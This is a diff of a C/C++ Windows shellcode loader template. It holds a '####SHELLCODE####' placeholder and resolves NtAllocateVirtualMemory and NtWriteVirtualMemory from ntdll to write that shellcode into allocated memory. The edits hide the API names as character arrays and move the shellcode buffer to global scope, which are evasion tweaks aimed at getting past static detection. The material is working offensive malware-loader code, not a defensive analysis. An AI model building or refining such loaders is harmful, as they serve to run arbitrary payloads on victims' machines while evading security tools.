@@ -36,13 +36,13 @@ typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
 } NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;
 
 
-typedef NTSTATUS(NTAPI* myNtTestAlert)(
-    VOID
-);
+// typedef NTSTATUS(NTAPI* myNtTestAlert)(
+//     VOID
+// );
 
-typedef struct _NTTESTALERT_ARGS {
-    UINT_PTR pNtTestAlert;          // pointer to NtTestAlert - rax
-} NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;
+// typedef struct _NTTESTALERT_ARGS {
+//     UINT_PTR pNtTestAlert;          // pointer to NtTestAlert - rax
+// } NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;
 
 // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
 typedef enum _QUEUE_USER_APC_FLAGS {
@@ -78,12 +78,17 @@ extern "C" {
 }
 
 
+unsigned char magiccode[] = ####SHELLCODE####;
 
 
 int main(int argc, char *argv[]) {
 
 
-    unsigned char magiccode[] = ####SHELLCODE####;
+
+
+    ///// Put everything after this line::!!!!
+
+    ///
 
 
 
@@ -98,7 +103,7 @@ int main(int argc, char *argv[]) {
 	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
 	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
     NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
-    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
+    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA("ntdll"), NtAllocateFuture);
     ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
     ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
     ntAllocateVirtualMemoryArgs.size = &allocatedsize;
@@ -132,10 +137,10 @@ int main(int argc, char *argv[]) {
 
 
 	///Write process memory: 
-
+    const char NtWriteFuture[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
     ULONG bytesWritten = 0;
     NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
-    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), "NtWriteVirtualMemory");
+    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtWriteFuture);
     ntWriteVirtualMemoryArgs.hProcess = (HANDLE)-1;
     ntWriteVirtualMemoryArgs.address = allocatedAddress;
     ntWriteVirtualMemoryArgs.buffer = (PVOID)magiccode;
